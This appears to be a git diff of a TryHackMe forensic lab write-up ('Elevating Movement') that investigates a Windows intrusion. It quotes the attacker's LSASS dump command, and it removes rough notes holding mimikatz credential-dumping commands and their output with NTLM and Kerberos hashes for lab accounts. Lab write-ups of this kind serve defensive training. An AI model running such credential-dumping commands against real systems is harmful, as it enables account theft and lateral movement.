@@ -1,5 +1,5 @@
 <h1 align="center">Elevating Movement</h1>
-<p align="center">2025, October 26  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>538</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Investigate the second, Windows part of the Honeynet Collapse! &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/elevatingmovement">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/7c99579b-0a08-4e18-9045-80dad21d2287"></p>
+<p align="center">2025, November 8  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>1</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Investigate the second, Windows part of the Honeynet Collapse! &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/elevatingmovement">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/7c99579b-0a08-4e18-9045-80dad21d2287"></p>
 
 <h2>Task 1 . Introduction</h2>
 <h3>Meet DeceptiTech</h3>
@@ -79,11 +79,11 @@ PS C:\Users\emily.ross\Documents>
 <p>2.4. Which full command line was used to dump the OS credentials?<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>pcd.exe /accepteula -ma lsass.exe text.txt</code></p>
 
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - remember that the successfull RDP connection took place on 2025-06-30<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - remember that the successfull RDP connection took place on <code>2025-06-30</code><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>File Explorer</code><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - navigate to <code>Users</code> → <code>Administrator</code> → <code>Documents</code><br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - identify two directories<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - access <code>20250630</code> updated on 2025-06-30<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - identify 2 directories<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - access <code>20250630</code> updated on <code>2025-06-30</code><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - open <code>PowerShell_transcript.SRV-IT-QA.KSUYD5bK.20250630182641</code><br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - decode the Base64 excerpts in the previous file<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - the first one confirms 2.3.´s answer<br>
@@ -97,6 +97,7 @@ C:\Users\Administrator\Documents\certutil -decode a.txt decoded.txt
 ```bash
 C:\Users\Administrator\Documents\type decoded.txt
 ```
+
 <img width="900px" hspace="30" src="https://github.com/user-attachments/assets/79ec68d7-6c7b-44e4-8e93-a2134b5c9312"><br>
 <img width="900px" hspace="30" src="https://github.com/user-attachments/assets/0c515fbd-0774-4cbd-abf4-fc59af81295a"><br><br>
 <img width="900px" hspace="30" src="https://github.com/user-attachments/assets/cf1009ee-d997-47fe-80ca-059a10fcb676"><br><br>
@@ -111,7 +112,7 @@ C:\Users\Administrator\Documents\type decoded.txt
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>2025-06-30 19:47:14</code></p>
 
 - execute the command below to generate a .csv file containing....<br>
-- launch <code>TimelineExplorer</code> which is int the following path: C:\<code>Users\Administrator\Desktop\EZ tools\TimelineExplorer</code><br>
+- launch <code>TimelineExplorer</code> which is in C:\Users\Administrator\Desktop\EZ tools\TimelineExplorer<br>
 - analyze considering the date and time discovered in 2.1. reflected in <code>Run Time</code> column<br>
 
 ```bash
@@ -121,13 +122,12 @@ C:\Users\Administrator\Desktop\PECmd.exe C:\Windows\Prefetch --csv ..\Prefetch -
 <img width="900px" hspace="30" src="https://github.com/user-attachments/assets/f9e1648b-0d5c-4b5f-8ef2-134998425d43"><br>
 <img width="600px" hspace="30" src="https://github.com/user-attachments/assets/3484647b-bfcb-49bf-b8f9-19eb17a32780"><br>
 <img width="600px" hspace="30" src="https://github.com/user-attachments/assets/9b80c8b4-ddb6-4f4c-8319-e597a05d1dc4"><br>
-<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/bb401148-9394-4bd9-86de-893e96d2336a"></p>
+<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/42ba344d-7bd0-4bbe-b15a-4b9b0e587399"><br>
+<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/bbcd75f6-ce5f-4884-8703-1cbed25f7a4d"></p>
 
 <br>
 <p>2.6. What is the NTLM hash of matthew.collins' domain password?<br>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>____</code></p>
-
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - identify C:\Windows\system32\<code>text.txt.dmp</code> in 2.4<br>
 
 
 ```bash
@@ -176,148 +176,3 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 
 <img width="1189" height="202" alt="image" src="https://github.com/user-attachments/assets/91e47436-a8e5-448b-a5da-35627a8424e2" />
-
-
-
-
-<img width="1189" height="202" alt="image" src="https://github.com/user-attachments/assets/21cb325d-2928-444c-b296-a387bdc5c4f0" />
-
-
-<img width="1202" height="385" alt="image" src="https://github.com/user-attachments/assets/a0309215-157c-4d8b-b0ee-b5915d703f13" />
-
-
-<img width="1201" height="525" alt="image" src="https://github.com/user-attachments/assets/fcc1fff0-82f3-4a55-8683-94866f8aad2d" />
-
-
-  Random Value : a1528cd40d99e5dfa9fa0809af998696
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : WDAGUtilityAccount
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
-      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
-      des_cbc_md5       (4096) : ce9b2cabd55df4ce
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : WDAGUtilityAccount
-    Credentials
-      des_cbc_md5       : ce9b2cabd55df4ce
-
-
-mimikatz #
-
-
-
-
-  Random Value : a1528cd40d99e5dfa9fa0809af998696
-
-* Primary:Kerberos-Newer-Keys *
-    Default Salt : WDAGUtilityAccount
-    Default Iterations : 4096
-    Credentials
-      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
-      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
-      des_cbc_md5       (4096) : ce9b2cabd55df4ce
-
-* Packages *
-    NTLM-Strong-NTOWF
-
-* Primary:Kerberos *
-    Default Salt : WDAGUtilityAccount
-    Credentials
-      des_cbc_md5       : ce9b2cabd55df4ce
-
-
-mimikatz #
-
-
-
-sekurlsa::logonpasswords
-
-
-
-
-mimikatz # lsadump::lsa /inject
-Domain : SRV-IT-QA / S-1-5-21-757488092-1620230869-2422165445
-
-RID  : 000001f4 (500)
-User : Administrator
-
- * Primary
-    NTLM : d6da33571333169add40f1bb8050cd36
-    LM   :
-  Hash NTLM: d6da33571333169add40f1bb8050cd36
-
-RID  : 000001f7 (503)
-User : DefaultAccount
-
- * Primary
-    NTLM :
-    LM   :
-
-RID  : 000001f5 (501)
-User : Guest
-
- * Primary
-    NTLM :
-    LM   :
-
-RID  : 000001f8 (504)
-User : WDAGUtilityAccount
-
- * Primary
-    NTLM : 58f8e0214224aebc2c5f82fb7cb47ca1
-    LM   :
-  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1
-
-mimikatz #
-
-
-
-
-mimikatz # sekurlsa::minidump C:\Windows\system2\text.txt.dmp
-Switch to MINIDUMP : 'C:\Windows\system2\text.txt.dmp'
-
-mimikatz # sekurlsa::logonpasswords
-Opening : 'C:\Windows\system2\text.txt.dmp' file for minidump...
-ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000003)
-
-mimikatz #
-
-Task Manager
-Details
-right-click lasaa.exe
-
-
-
-
-<img width="836" height="127" alt="image" src="https://github.com/user-attachments/assets/e25fb3d5-fd66-4083-851c-ae4d9baa18cc" />
-
-
-<img width="830" height="252" alt="image" src="https://github.com/user-attachments/assets/e76ab52c-2c5b-4496-8c37-95e812d95136" />
-
-
-
-<img width="888" height="134" alt="image" src="https://github.com/user-attachments/assets/1a3bf0d7-a914-4f76-8728-99105a8df78c" />
-
-
-
-
-
-
-<img width="1189" height="438" alt="image" src="https://github.com/user-attachments/assets/c8a438bc-6cd0-4c55-a829-8e126078f471" />
-
-<img width="1066" height="495" alt="image" src="https://github.com/user-attachments/assets/f2bc5395-8aee-4503-aa3d-691b063c2392" />
-
-
-
-<img width="865" height="45" alt="image" src="https://github.com/user-attachments/assets/cb25bd6e-0be2-4df6-90c5-c47e599d7129" />
-
-
-<br>
-<br>
-<br>
